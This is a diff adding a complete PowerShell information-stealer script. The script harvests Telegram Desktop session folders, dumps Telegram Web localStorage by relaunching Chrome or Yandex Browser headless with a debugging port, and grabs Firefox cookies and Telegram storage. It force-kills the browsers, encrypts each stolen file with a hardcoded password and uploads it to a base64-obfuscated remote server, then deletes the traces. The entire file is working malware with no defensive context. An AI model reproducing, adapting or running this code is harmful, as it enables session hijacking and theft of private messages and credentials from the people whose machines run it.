@@ -1,0 +1,303 @@
+#region
+$ProgressPreference = 'SilentlyContinue'
+$VerbosePreference = 'SilentlyContinue'
+$WarningPreference = 'SilentlyContinue'
+
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+#endregion
+
+function Encrypt-FileAes {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$InputFile,
+
+        [Parameter(Mandatory=$false)]
+        [string]$Password = "D$kJzLt1C@Y2Fhy"
+    )
+
+
+    if (!(Test-Path $InputFile)) {
+        throw "Файл не найден: $InputFile"
+    }
+
+    $outputFile = "$InputFile.encr"
+
+    # Соль (фиксированная в этом примере)
+    $salt = [byte[]](1..16)
+
+    $derive = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($Password, $salt, 10000)
+
+    $key = $derive.GetBytes(32)
+    $iv  = $derive.GetBytes(16)
+
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Key = $key
+    $aes.IV = $iv
+
+    $encryptor = $aes.CreateEncryptor()
+
+    $data = [System.IO.File]::ReadAllBytes($InputFile)
+
+    $ms = New-Object System.IO.MemoryStream
+    $cs = New-Object System.Security.Cryptography.CryptoStream(
+        $ms,
+        $encryptor,
+        [System.Security.Cryptography.CryptoStreamMode]::Write
+    )
+
+    $cs.Write($data, 0, $data.Length)
+    $cs.Close()
+
+    [System.IO.File]::WriteAllBytes($outputFile, $ms.ToArray())
+
+    return $outputFile
+}
+
+function Snitch{
+    param(
+        [string]$File
+    )
+    $File_enc = $File + ".encr"
+    Encrypt-FileAes -InputFile $File | Out-Null
+    Invoke-RestMethod -Uri "$([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cDovL3NldG96LnN1OjY5Njk=")))" `
+    -Method Post `
+    -InFile "$File_enc" `
+    -Headers @{ "X-Filename" = "$File_enc" } > $null
+    Remove-Item "$File_enc"
+}
+
+function Invoke-CDPCommand {
+    param($wsUrl, $method, $params = @{})
+    
+    $ws = New-Object System.Net.WebSockets.ClientWebSocket
+    $cts = New-Object System.Threading.CancellationTokenSource
+    
+    $ws.ConnectAsync([System.Uri]$wsUrl, $cts.Token).Wait()
+    
+    $message = @{ id = 1; method = $method; params = $params } | ConvertTo-Json -Compress
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($message)
+    $ws.SendAsync([System.ArraySegment[byte]]::new($bytes), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $cts.Token).Wait()
+    
+    $ms = New-Object System.IO.MemoryStream
+    $buffer = [byte[]]::new(65536)
+    do {
+        $result = $ws.ReceiveAsync([System.ArraySegment[byte]]::new($buffer), $cts.Token).Result
+        $ms.Write($buffer, 0, $result.Count)
+    } while (-not $result.EndOfMessage)
+    
+    $response = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
+    $ms.Dispose()
+    
+    try { $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "", $cts.Token).Wait() } catch {}
+    
+    return $response | ConvertFrom-Json
+}
+
+function Get-TelgramWeb{
+    param(
+        [string]$Browser
+    )
+    if($Browser -eq "Chrome"){
+        $realProfile = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+        $tempProfile = "$env:TEMP\chrome-debug"
+        $chrome      = "C:\Program Files\Google\Chrome\Application\chrome.exe"
+        $process_name = "chrome"
+    }elseif($Browser -eq "Yandex"){
+        $realProfile = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"
+        $tempProfile = "$env:TEMP\yandex-debug"
+        $chrome      = "C:\Users\user\AppData\Local\Yandex\YandexBrowser\Application\browser.exe"
+        $process_name = "browser"
+    }
+
+#region
+$debugPort   = 9222
+
+Get-Process $process_name -ErrorAction SilentlyContinue | Stop-Process -Force
+Start-Sleep -Seconds 2
+
+if (Test-Path $tempProfile) { Remove-Item $tempProfile -Recurse -Force }
+Copy-Item $realProfile $tempProfile -Recurse -Force
+Copy-Item "$realProfile\Local State" "$tempProfile\Local State" -Force
+
+$chromeArgs = @(
+    "--user-data-dir=`"$tempProfile`"",
+    "--remote-debugging-port=$debugPort",
+    "--remote-allow-origins=*",
+    "--disable-features=LockProfileCookieDatabase",
+    "--disable-background-networking",
+    "--disable-client-side-phishing-detection",
+    "--disable-default-apps",
+    "--disable-hang-monitor",
+    "--disable-popup-blocking",
+    "--disable-prompt-on-repost",
+    "--disable-sync",
+    "--enable-automation",
+    "--no-first-run",
+    "--no-default-browser-check",
+    "--password-store=basic",
+    "--use-mock-keychain",
+    "--headless",
+    "web.telegram.org"
+)
+
+
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName               = $chrome
+$psi.Arguments              = $chromeArgs -join " "
+$psi.UseShellExecute        = $false
+$psi.RedirectStandardOutput = $true
+$psi.RedirectStandardError  = $true
+$psi.WindowStyle            = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$psi.CreateNoWindow         = $true
+
+$proc = [System.Diagnostics.Process]::Start($psi)
+
+
+# Ждём порт
+$ready = $false
+for ($i = 0; $i -lt 15; $i++) {
+    Start-Sleep -Seconds 1
+    try {
+        Invoke-RestMethod -Uri "http://localhost:$debugPort/json/version" -ErrorAction Stop | Out-Null
+        $ready = $true
+        break
+    } catch {}
+}
+
+if (-not $ready) {
+    exit 
+ }
+#endregion
+
+#region
+$maxWait = 20
+for ($i = 0; $i -lt $maxWait; $i++) {
+    Start-Sleep -Seconds 1
+    $tabs = Invoke-RestMethod -Uri "http://localhost:$debugPort/json"
+    $tab  = $tabs | Where-Object { $_.webSocketDebuggerUrl -and $_.url -like "*telegram*" } | Select-Object -First 1
+    if ($tab) {
+        try {
+            $result = Invoke-CDPCommand -wsUrl $tab.webSocketDebuggerUrl `
+                                        -method "Runtime.evaluate" `
+                                        -params @{
+                                            expression    = "Object.keys(localStorage).length"
+                                            returnByValue = $true
+                                        }
+            if ($result.result.result.value -gt 0) { break }
+        } catch {}
+    }
+}
+#endregion
+
+#region
+$tabs = Invoke-RestMethod -Uri "http://localhost:$debugPort/json"
+$tab  = $tabs | Where-Object { $_.url -like "*web.telegram.org*" } | Select-Object -First 1
+
+$result = Invoke-CDPCommand -wsUrl $tab.webSocketDebuggerUrl `
+                            -method "Runtime.evaluate" `
+                            -params @{
+                                expression    = "JSON.stringify(Object.fromEntries(Object.keys(localStorage).map(k => [k, localStorage.getItem(k)])))"
+                                returnByValue = $true
+                            }
+
+$data = $result.result.result.value | ConvertFrom-Json
+
+#endregion
+
+#region
+$json = $data | ConvertTo-Json
+
+
+$importScript = "$env:TEMP\telegram_import_$($Browser).js"
+
+@"
+const data = $json;
+Object.entries(data).forEach(([k, v]) => localStorage.setItem(k, v));
+console.log('Импортировано ключей: ' + Object.keys(data).length);
+location.reload();
+"@ | Out-File $importScript -Encoding utf8
+
+Get-Process $process_name -ErrorAction SilentlyContinue | Stop-Process -Force
+Start-Sleep -Seconds 3
+try{Snitch -File $importScript}catch{}
+Remove-Item -Recurse $tempProfile -Force
+Remove-Item $importScript
+#endregion
+}
+
+#region
+
+$found = $false
+$path = ""
+
+try {
+    if (Test-Path "$env:USERPROFILE\AppData\Roaming\Telegram Desktop\tdata\") {
+        $path = "$env:USERPROFILE\AppData\Roaming\Telegram Desktop\tdata\"
+        $found = $true
+    } else {
+        $telegramProc = Get-Process "*telegram*" -ErrorAction SilentlyContinue | Select-Object -First 1
+        if ($telegramProc -and $telegramProc.Path) {
+            $path = Join-Path (Split-Path $telegramProc.Path) 'tdata'
+            if (Test-Path $path) {
+                $found = $true
+            } else {
+                $path = ""
+            }
+        }
+    }
+} catch {
+    $found = $false
+    $path = ""
+}
+
+if($found){
+
+    $dirs = (dir -Path $path -Directory -Exclude dumps,emoji,tdummy,temp,user_data*).Name
+
+    foreach ($dir in $dirs){
+
+        if (Test-Path $($path + $dir + ".zip")) {
+            Remove-Item $($path + $dir + ".zip") -Force
+        }
+
+        [System.IO.Compression.ZipFile]::CreateFromDirectory(
+            $($path + $dir),
+            $($path + $dir + ".zip")
+        )
+
+        Snitch -File "$($path + $dir + ".zip")"
+        Snitch -File "$($path + $dir + "s")"
+        
+    }
+
+    Snitch -File "$($path + "key_datas")"
+    Snitch -File "$($path + "settingss")"
+
+}else{}
+
+if(Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe"){
+    Get-TelgramWeb -Browser "Chrome"
+}
+if(Test-Path "C:\Users\user\AppData\Local\Yandex\YandexBrowser\Application\browser.exe"){
+    Get-TelgramWeb -Browser "Yandex"
+}
+#endregion
+
+#region
+if(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles"){
+    $profilePath = (Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -Exclude "*.default" ).Name
+
+    foreach($profile in $profilePath){
+        if(Test-Path "$("$env:APPDATA\Mozilla\Firefox\Profiles\" + $profile + "\cookies.sqlite")"){
+            $db = "$("$env:APPDATA\Mozilla\Firefox\Profiles\" + $profile + "\")"
+        }
+    }
+    try{(Get-Process "*firefox*").Id|  ForEach-Object {Stop-Process -Id $_ -Force -ErrorAction SilentlyContinue}}catch{}
+
+    try{Snitch -File "$($db + "cookies.sqlite")"}catch{}
+    try{Snitch -File "$($db + "storage\default\https+++web.telegram.org\ls\data.sqlite")"}catch{}
+    try{Snitch -File "$($db + "storage\default\https+++web.telegram.org\ls\usage")"}catch{}
+    
+    
+}
+#endregion
